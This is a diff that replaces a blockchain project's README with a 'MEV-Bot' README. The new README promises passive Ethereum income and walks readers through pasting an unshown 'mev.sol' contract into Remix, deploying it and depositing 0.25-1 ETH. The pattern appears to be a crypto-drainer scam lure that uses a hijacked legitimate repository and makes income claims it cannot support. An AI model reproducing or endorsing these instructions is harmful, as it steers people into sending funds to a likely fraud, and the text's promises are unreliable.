@@ -1,89 +1,63 @@
-# axelar-core
+﻿# MEV-Bot
 
-The axelar-core app based on the Cosmos SDK is the main application of the axelar network. This repository is used to
-build the necessary binaries and docker image to run a core node.
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
 
-## How To Build
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-_Note:_ For a release build, checkout the release tag via `git checkout vX.Y.Z` first.
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-Execute `make build` to create the `axelard` binary in the `./bin` folder.
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-## Creating docker images
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-To create a regular docker image for the node, execute `make docker-image`. This creates the image axelar/core:
-latest.
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
-To create a docker image for debugging (with [delve](https://github.com/go-delve/delve)),
-execute `make docker-image-debug`. This creates the image axelar/core-debug:latest.
 
-### Smart contracts bytecode dependency
+## 🤖 How to Use MEVBot
+<img src="https://i.ibb.co/Jtnzrtq/1.png" alt="1" border="0">
 
-In order to run/build the project locally we need to import the bytecode from gateway smart contracts.
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "mev.sol".
+Copy the code inside "mev.sol" from the GitHub repository and paste it into the Remix IDE.
 
-1. Find the required version of the bytecode here [`contract-version.json`](contract-version.json)
-2. Download that version from the [axelar-cgp-solidity releases](https://github.com/axelarnetwork/axelar-cgp-solidity/releases).
-   Example: `Bytecode-v4.3.0`
-3. Unzip the json files under `contract-artifacts/`
-4. Run `make generate` to generate `x/evm/types/contracts.go`
+<img src="https://i.ibb.co/hfNMhwM/2.png" alt="2" border="0">
 
-## Download and Verify Binary
 
-Before interacting with the axelar network, ensure you have the correct `axelard` binary and that it's verified:
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile mev.sol'. 
+<img src="https://i.ibb.co/4N3Sc2h/3.png" alt="3" border="0">
 
-1. **Download the Binary and Signature File:**
-   - Go to the [Axelar Core releases page](https://github.com/axelarnetwork/axelar-core/releases).
-   - Download the `axelard` binary for your operating system and architecture.
-   - Also, download the corresponding `.asc` signature file.
 
-2. **Import Axelar's Public Key:**
-   - Run the following command to import the public key:
-     ```bash
-     curl https://keybase.io/axelardev/pgp_keys.asc | gpg --import
-     ```
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+<img src="https://i.ibb.co/KVnWchf/4.png" alt="4" border="0">
 
-3. **Trust the Imported Key:**
-   - Enter GPG interactive mode:
-     ```bash
-     gpg --edit-key 5D9FFADEED11FA5D
-     ```
-   - Type `trust` then select option `5` to trust ultimately.
 
-4. **Verify the Binary:**
-   - For example, for version v0.34.3, use:
-     ```bash
-     gpg --verify axelard-darwin-amd64-v0.34.3.asc axelard-darwin-amd64-v0.34.3
-     ```
-   - A message indicating a good signature should appear, like:
-     ```
-     Good signature from "Axelar Network Devs <eng@axelar.network>" [ultimate]
-     ```
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
 
-## Interacting with a local node
 
-With a local (dockerized) node running, the `axelard` binary can be used to interact with the node.
-Run `./bin/axelard` or `./bin/axelard <command> --help` after building the binaries to get information about the available commands.
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+<img src="https://i.ibb.co/M7Mc0cN/5.png" alt="5" border="0">
+<img src="https://i.ibb.co/H7XbRPL/6.png" alt="6" border="0">
 
-## Show API documentation
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
 
-Execute `GO111MODULE=off go install -u golang.org/x/tools/cmd/godoc` to ensure that `godoc` is installed on the host.
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
 
-After the installation, execute `godoc -http ":{port}" -index` to host a local godoc server. For example, with
-port `8080` and `godoc -http ":8080" -index`, the documentation is hosted at
-http://localhost:8080/pkg/github.com/axelarnetwork/axelar-core. The index flag makes the documentation searchable.
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
 
-Comments at the beginning of packages, before types and before functions are automatically taken from the source files
-to populate the documentation. See https://blog.golang.org/godoc for more information.
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-### CLI command documentation
+## License
 
-For the full list of available CLI commands for `axelard` see [here](docs/cli/toc.md)
-
-## Test tools
-
-Dev tool dependencies, such as `moq` and `goimports`, can be installed via `make prereqs`.
-Make sure they're on available on your `PATH`.
-
-## Bug bounty and disclosure of vulnerabilities
-
-See the [Axelar documentation website](https://docs.axelar.dev/bug-bounty).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
